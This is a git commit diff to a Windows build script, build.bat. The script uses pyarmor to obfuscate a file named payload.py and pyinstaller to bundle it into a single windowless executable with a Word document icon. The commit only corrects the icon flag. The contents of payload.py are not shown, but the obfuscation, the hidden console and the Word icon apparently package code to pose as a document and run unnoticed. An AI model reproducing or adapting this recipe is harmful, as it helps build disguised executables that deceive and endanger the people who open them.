3bd48b23f2bd7de829dc3c05a0e25a986a007a6b
saacidyuusuf <saacidyuusuf871@gmail.com>
2024-12-01 08:27:34 -0500

    couple change

--- build.bat
+++ build.bat
@@ -2,4 +2,4 @@
 
 "C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyarmor-7.exe" obfuscate --recursive payload.py
 
-"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe" --onefile --noconsole icon=word.ico payload.py
+"C:\Users\K C T\AppData\Local\Programs\Python\Python313\Scripts\pyinstaller.exe" --onefile --noconsole --icon=word.ico payload.py
